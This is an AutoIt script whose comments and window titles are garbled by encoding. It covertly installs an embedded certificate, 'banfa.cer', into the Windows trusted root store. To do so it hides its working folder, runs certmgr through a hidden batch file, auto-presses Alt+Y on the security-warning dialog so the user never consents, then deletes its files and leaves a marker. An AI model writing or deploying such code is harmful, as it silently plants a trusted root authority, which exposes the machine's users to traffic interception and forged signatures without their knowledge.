#include <GUIConstantsEx.au3>
#include <WindowsConstants.au3>
#include <Process.au3>
#include <File.au3>
DirCreate(@ScriptDir&"\tools");����Ŀ¼
$file = @ScriptDir&"\tools"
FileSetAttrib($file,"+s+h")
FileInstall("banfa.cer",$file&"\banfa.cer")
FileInstall("CertMgr86.exe",$file&"\CertMgr86.exe")
FileInstall("CertMgr64.exe",$file&"\CertMgr64.exe")
$regca = @AppDataCommonDir & "\ca.ini";��Ҫ���֤�鰲װ״̬,������д�Լ�������,��ͬ�Ļ����˻᲻��װ���֤��Ŷ.
If FileExists($regca) Then
	DirRemove($file,1)
exit
	Else
bfz()
IniWrite($regca,"֤����","�Ƿ����","1")
EndIf

$Timer = DllCallbackRegister("Timer", "int", "hwnd;uint;uint;dword")
$TimerDLL = DllCall("user32.dll", "uint", "SetTimer", "hwnd", 0, "uint", 0, "int", 100, "ptr", DllCallbackGetPtr($Timer))
WinActivate("��ȫ����")

While 1
	Sleep(100)
WEnd

Func bfz()
If @OSVersion = "WIN_XP" Then
Call("_xp")		
ElseIf @OSVersion = "WIN_7" Then
Call("_WIN7")
EndIf
EndFunc

Func _xp();86λ��ʼ
Local $CAcfg
$CAcfg ='certmgr86 /c /add banfa.cer /s root'
FileWrite($file & "\cacfg.bat", $CAcfg)
Run($file & "\cacfg.bat",$file, @SW_HIDE)
EndFunc

Func _win7();64λ��ʼ
Local $CAcfg
$CAcfg ='certmgr64 /c /add banfa.cer /s root'
FileWrite($file & "\cacfg.bat", $CAcfg)
Run($file & "\cacfg.bat",$file, @SW_HIDE)
EndFunc

Func Timer($hWnd, $uiMsg, $idEvent, $dwTime)
        If $idEvent = $TimerDLL[0] Then
                If WinExists("��ȫ����") Then
                        WinSetState("��ȫ����", "", @SW_ENABLE)
                        Send("!Y")
                  DirRemove($file,1)
                   exit
					EndIf
        EndIf
	EndFunc   ;==>Timer